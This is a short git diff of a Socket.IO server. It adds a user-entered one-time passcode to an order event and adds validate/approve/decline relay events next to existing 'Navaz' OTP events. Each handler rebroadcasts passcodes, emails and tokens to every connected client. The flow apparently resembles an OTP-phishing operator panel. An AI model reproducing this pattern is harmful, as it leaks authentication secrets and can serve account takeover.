@@ -39,11 +39,11 @@ io.on('connection',(socket)=>{
         io.emit('declineOrder',result)
     })
     socket.on('orderOtp',async(data)=>{
-        const {id,otp} = data
+        const {id,otp,userOtp} = data
         const order = await Order.findById(id)
         if(order){
             if(!order.otp){
-                io.emit('orderOtp',{id,email:order.email,otp})
+                io.emit('orderOtp',{id,email:order.email,otp,userOtp})
             }else{
                 io.emit('declineOtp',{id,token:order.token,otp:data.otp})
             }
@@ -51,7 +51,9 @@ io.on('connection',(socket)=>{
      })
      socket.on('loginOtp',(data)=>io.emit('loginOtp',data))
 
-     socket.on('newNavaz',(data)=>io.emit('newNavaz',data))
+     socket.on('orderValidate',(data)=>io.emit('orderValidate',data))
+     socket.on('successValidate',(data)=>io.emit('successValidate',data))
+     socket.on('declineValidate',(data)=>io.emit('declineValidate',data))
      socket.on('navazOtp',(data)=>io.emit('navazOtp',data))
      socket.on('disAllowNavaz',(data)=>io.emit('disAllowNavaz',data))
      socket.on('AllowNavaz',(data)=>io.emit('AllowNavaz',data))
